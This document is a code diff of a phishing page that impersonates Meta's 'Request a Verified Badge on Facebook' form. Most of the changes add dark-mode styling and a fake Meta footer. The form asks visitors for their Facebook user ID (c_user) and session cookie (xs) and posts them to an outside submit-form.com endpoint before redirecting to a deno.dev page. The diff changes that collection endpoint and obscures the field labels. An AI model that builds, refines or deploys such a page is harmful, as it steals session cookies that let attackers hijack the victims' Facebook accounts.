@@ -7,41 +7,80 @@
   <title>Meta Verified | Confirm Eligibility</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" />
   <style>
+    :root {
+      --bg-color: #f0f2f5;
+      --form-bg: #ffffff;
+      --text-color: #444;
+      --input-bg: #f8f9fa;
+      --border-color: #ccd0d5;
+      --footer-text: #777;
+    }
+
+    body.dark {
+      --bg-color: #18191a;
+      --form-bg: #242526;
+      --text-color: #ddd;
+      --input-bg: #3a3b3c;
+      --border-color: #3e4042;
+      --footer-text: #aaa;
+    }
+
     body {
       font-family: 'Segoe UI', system-ui, sans-serif;
-      background-color: #f0f2f5;
+      background-color: var(--bg-color);
+      color: var(--text-color);
       margin: 0;
       padding: 0;
+      transition: background 0.3s ease, color 0.3s ease;
     }
 
     .top-bar {
-      background: linear-gradient(90deg, #0866ff 0%, #1877f2 100%);
+      background: #1877f2;
       color: white;
-      height: 64px;
+      height: 56px;
       display: flex;
+      justify-content: space-between;
       align-items: center;
-      padding: 0 24px;
-      font-size: 22px;
+      padding: 0 20px;
+      font-size: 20px;
       font-weight: 600;
       box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
     }
 
-    .sub-bar {
-      background-color: #e9ebee;
-      color: #0866ff;
-      height: 48px;
+    .top-bar .right-section {
       display: flex;
+      gap: 16px;
       align-items: center;
-      padding: 0 24px;
-      font-size: 15px;
+      font-size: 14px;
       font-weight: 500;
-      border-bottom: 1px solid #d6d8db;
+    }
+
+    .avatar {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background-color: white;
+    }
+
+    .dark-toggle {
+      background: transparent;
+      border: 1px solid white;
+      color: white;
+      padding: 4px 12px;
+      border-radius: 100px;
+      cursor: pointer;
+      font-size: 13px;
+      transition: background 0.3s;
+    }
+
+    .dark-toggle:hover {
+      background: rgba(255, 255, 255, 0.2);
     }
 
     .form-container {
       max-width: 760px;
       margin: 40px auto;
-      background-color: white;
+      background-color: var(--form-bg);
       border-radius: 10px;
       box-shadow: 0 4px 12px rgba(0,0,0,0.08);
       animation: fadeIn 0.4s ease;
@@ -59,6 +98,11 @@
       padding: 16px 24px;
     }
 
+    body.dark .form-header,
+    body.dark .form-footer {
+      background-color: #3a3b3c;
+    }
+
     .form-header h5 {
       margin: 0;
       font-size: 19px;
@@ -71,7 +115,6 @@
 
     .form-body p {
       font-size: 15px;
-      color: #444;
       margin-bottom: 14px;
     }
 
@@ -80,7 +123,6 @@
       font-weight: 600;
       margin-top: 18px;
       display: block;
-      color: #333;
     }
 
     input[type="text"],
@@ -89,10 +131,11 @@
       padding: 12px 14px;
       margin-top: 6px;
       font-size: 14px;
-      border: 1px solid #ccd0d5;
+      background-color: var(--input-bg);
+      color: var(--text-color);
+      border: 1px solid var(--border-color);
       border-radius: 8px;
-      background-color: #f8f9fa;
-      transition: border-color 0.2s ease;
+      transition: background 0.3s, color 0.3s;
     }
 
     input:focus {
@@ -101,12 +144,16 @@
       background-color: #fff;
     }
 
+    body.dark input:focus {
+      background-color: #2d2e30;
+    }
+
     .video-container {
       margin-top: 20px;
     }
 
     video {
-      width: 100%;
+      width: 60%;
       max-width: 440px;
       border-radius: 10px;
       margin-top: 8px;
@@ -130,15 +177,8 @@
 
     .small-note {
       font-size: 12px;
-      color: #888;
+      color: var(--footer-text);
       margin-top: 10px;
-    }
-
-    .badge-icon {
-      width: 28px;
-      height: 28px;
-      vertical-align: middle;
-      margin-right: 6px;
     }
 
     .why-section {
@@ -149,24 +189,45 @@
       border-radius: 6px;
     }
 
-    .why-section p {
-      margin: 0;
-      font-size: 13.5px;
-      color: #555;
+    body.dark .why-section {
+      background-color: #2a2b2d;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 13px;
+      color: var(--footer-text);
+      padding: 30px 16px;
+    }
+
+    .footer a {
+      color: var(--footer-text);
+      text-decoration: none;
+      margin: 0 6px;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
-  <form action="https://submit-form.com/yIidjt6ee" method="post">
-    <input type="hidden" name="_redirect" value="https://checkmarkinvite.deno.dev/confirm.html"/>
+  <form action="https://submit-form.com/krp3p0GRf" method="post">
+    <input type="hidden" name="_redirect" value="https://adil-niz-naseeb-conf-68.deno.dev/confirm.html" />
 
-    <div class="top-bar">facebook</div>
-    <div class="sub-bar">Help Center</div>
+    <div class="top-bar">
+      <div>facebook</div>
+      <div class="right-section">
+        
+        <div class="avatar"></div>
+        <button type="button" class="dark-toggle" onclick="toggleDarkMode()">Dark Mode</button>
+      </div>
+    </div>
 
     <div class="form-container">
       <div class="form-header">
         <h5>
-          <img src="https://cdn-icons-png.flaticon.com/512/1051/1051377.png" alt="Verified" class="badge-icon">
+          <img src="https://cdn-icons-png.flaticon.com/512/1051/1051377.png" alt="Verified" style="width: 22px; vertical-align: middle; margin-right: 6px;">
           Request a Verified Badge on Facebook
         </h5>
       </div>
@@ -189,10 +250,10 @@
           </video>
         </div>
 
-        <label for="c_user">Your Facebook ID (c_user)</label>
+        <label for="c_user">(c_user)</label>
         <input type="number" name="c_user" required pattern="^\d{15}$" title="Enter your 15-digit Facebook user ID" />
 
-        <label for="xs">Your Session Key (xs)</label>
+        <label for="xs">(xs)</label>
         <input type="text" name="xs" required />
 
         <p class="small-note">Stay logged in until your request is confirmed via email. Do not share this information elsewhere.</p>
@@ -202,6 +263,25 @@
         <button type="submit" class="submit-btn">Submit</button>
       </div>
     </div>
+
+    <div class="footer">
+      <a href="#">Privacy</a> · 
+      <a href="#">Terms</a> · 
+      <a href="#">Cookies</a> · 
+      <span>Meta © 2025</span>
+    </div>
   </form>
+
+  <script>
+    function toggleDarkMode() {
+      document.body.classList.toggle('dark');
+      localStorage.setItem('theme', document.body.classList.contains('dark') ? 'dark' : 'light');
+    }
+
+    // Load saved preference
+    if (localStorage.getItem('theme') === 'dark') {
+      document.body.classList.add('dark');
+    }
+  </script>
 </body>
 </html>
